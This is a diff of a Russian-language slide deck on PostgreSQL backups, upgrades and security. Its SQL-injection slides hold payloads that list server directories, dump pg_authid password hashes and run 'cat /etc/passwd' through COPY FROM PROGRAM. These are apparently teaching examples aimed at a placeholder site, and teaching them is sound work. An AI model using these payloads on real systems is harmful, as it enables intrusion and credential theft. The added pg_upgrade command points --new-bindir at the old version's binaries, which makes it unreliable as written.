@@ -135,13 +135,98 @@ useMath: true
 </section>
 
 <section class="slide">
-    LVM
-    btrfs
-    pg_basebackup
-    pg_dump
-    pg_dumpall
-    pg_restore
-    pg_upgradecluster
+    <h2>Физическая копия: ОС</h2>
+    <h3>LVM</h3>
+    <pre style="font-size: 90%"><code
+            class="bash">lvcreate --size 100M --snapshot --name snap /dev/vg00/lvol1</code></pre>
+    <h3>btrfs, zfs</h3>
+    <pre style="font-size: 90%"><code class="bash">zfs snapshot datapool/docs@version1
+btrfs subvolume snapshot /btrfs/sub1 /btrfs/sub1/snapshot</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Физическая копия: ОС</h2>
+    <h3>Плюсы:</h3>
+    <ul>
+        <li>Быстрое создание резервной копии и восстановление;</li>
+        <li>Удобно использовать перед началом обновления.</li>
+    </ul>
+    <h3>Минусы:</h3>
+    <ul>
+        <li>Были проблемы с "заклиниванием" LVM после создания снимка (например: <a
+                href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1481881">bugs.launchpad.net #1481881</a>);
+        </li>
+        <li>Для СУБД резервная копия выглядит как внезапное выключение питания.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Физическая копия: pg_basebackup</h2>
+    <h3>Конфигурация:</h3>
+    <pre style="font-size: 90%"><code>archive_mode = on
+archive_command = 'test ! -f /backup/%f && cp %p /backup/%f'
+wal_writer_delay = 1s
+wal_level = hot_standby
+max_wal_senders = 5
+</code></pre>
+    <h3>Резервная копия:</h3>
+    <pre style="font-size: 90%"><code class="bash">pg_basebackup -D /tmp/backup -Ft -z -P
+pg_basebackup -D - -Ft -P    > backup.tar
+pg_basebackup -D - -Ft -P -z > backup.tgz</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Физическая копия: pg_basebackup</h2>
+    <h3>Плюсы:</h3>
+    <ul>
+        <li>Быстрое создание резервной копии;</li>
+        <li>Простое восстановление;</li>
+        <li>Возможно создание резервной копии по сети.</li>
+    </ul>
+    <h3>Минусы:</h3>
+    <ul>
+        <li>Нельзя создать резервную копию одной базы данных;</li>
+        <li>Нужно иметь права на репликацию и настроенную репликацию.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Логическая копия: pg_dump/pg_dumpall</h2>
+    <h3>Резервная копия:</h3>
+    <pre style="font-size: 90%"><code class="bash">pg_dump     movielens > db.sql
+pg_dump -Fc movielens > db.dump
+pg_dump -Fd movielens -j 5 -f dumpdir</code></pre>
+    <h3>Восстановление:</h3>
+    <pre style="font-size: 90%"><code class="bash">psql movielens < db.sql
+pg_restore -d movielens -Fc db.dump
+pg_restore -d movielens -Fd dumpdir</code></pre>
+</section>
+
+<section class="slide">
+    <h2>Логическая копия: pg_dump/pg_dumpall</h2>
+    <h3>Плюсы:</h3>
+    <ul>
+        <li>Возможно создание резервной копии по сети;</li>
+        <li>Возможно создание резервной копии части базы данных;</li>
+        <li>Можно восстановить резервную копию на другой версии СУБД.</li>
+    </ul>
+    <h3>Минусы:</h3>
+    <ul>
+        <li>Более высокая нагрузка на СУБД.</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Обвновление PostgreSQL</h2>
+    <h3>pg_upgradecluster</h3>
+    <pre style="font-size: 90%"><code class="bash">sudo pg_upgradecluster -v 9.5 9.4 main</code></pre>
+    <h3>pg_upgrade</h3>
+    <pre style="font-size: 90%"><code class="bash">/usr/lib/postgresql/9.5/bin/pg_upgrade
+  --old-datadir /var/lib/postgresql/9.4/main/ \
+  --new-datadir /var/lib/postgresql/9.5/main/ \
+  --old-bindir /usr/lib/postgresql/9.4/bin/ \
+  --new-bindir /usr/lib/postgresql/9.4/bin/
+</code></pre>
 </section>
 
 <section class="slide">
@@ -824,8 +909,8 @@ START SLAVE;
     <h3>Лимит на общее кол-во подключений</h3>
     <pre><code>max_connections = 100</code></pre>
     <div class="next">
-    <h3>Лимит на кол-во подключений с одного IP</h3>
-    <pre><code class="bash">iptables -A INPUT -p tcp --syn --dport 5432 \
+        <h3>Лимит на кол-во подключений с одного IP</h3>
+        <pre><code class="bash">iptables -A INPUT -p tcp --syn --dport 5432 \
     -m connlimit --connlimit-above 15 \
     -j REJECT --reject-with tcp-reset
     </code></pre>
@@ -921,7 +1006,8 @@ FROM information_schema.tables --</mark>'</code></pre>
     <h2>SQL-injection: Работа с файлами</h2>
     <ul>
         <li><code>http://xxx/news.php?id=-1' UNION SELECT '.', pg_ls_dir('.') --</code></li>
-        <li><code>http://xxx/news.php?id=-1' UNION SELECT 'pg_catalog.pg_authid', encode(<wbr/>pg_read_binary_file(<wbr/>pg_relation_filepath(<wbr/>'pg_catalog.pg_authid')), 'hex') --</code></li>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT 'pg_catalog.pg_authid', encode(&#8202;pg_read_binary_file(&#8202;pg_relation_filepath(&#8202;'pg_catalog.pg_authid')),
+            'hex') --</code></li>
     </ul>
 </section>
 
@@ -939,7 +1025,9 @@ UNION SELECT NULL, pg_sleep(3600) --</mark>'</code></pre>
     <h2>SQL-injection: Fatality</h2>
     <img class="next" style="position: absolute; bottom: 0px; height: 200px; right: 0px" src="toasty.png"/>
     <ul>
-        <li><code>http://xxx/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat /etc/passwd'; UPDATE news SET body = (SELECT string_agg(content, E'\n') FROM tmp1) WHERE id = 1; --</code><br/>
+        <li><code>http://xxx/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat
+            /etc/passwd'; UPDATE news SET body = (SELECT string_agg(content, E'\n') FROM tmp1) WHERE id = 1;
+            --</code><br/>
             <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1';
 CREATE TEMP TABLE tmp1 (content text);
 COPY tmp1 FROM PROGRAM 'cat /etc/passwd';
